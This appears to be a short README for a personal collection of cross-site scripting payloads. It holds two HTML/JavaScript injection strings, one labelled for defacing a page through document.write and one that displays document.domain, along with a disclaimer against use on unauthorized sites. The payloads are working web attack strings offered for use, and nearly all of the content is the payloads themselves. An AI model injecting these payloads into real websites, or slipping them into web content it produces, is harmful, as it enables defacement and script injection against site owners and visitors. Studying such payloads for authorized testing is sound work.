# xss
Personally created XSS payloads

# Danger zone! <br>
> Danger zone is the area which xss payloads can be OR will be harmfull to a web application <br>
> so, do no use them unless you're sure the web app will not be damaged! <br>

<br>

> Do not use these payloads in a random or unauthorized web site, I do not take any resposibility <br>
> to any script kiddies who decide to execute those on random places, you have been warned!

## document.write (Deface) <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
```
<br>

## document.domain <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
```
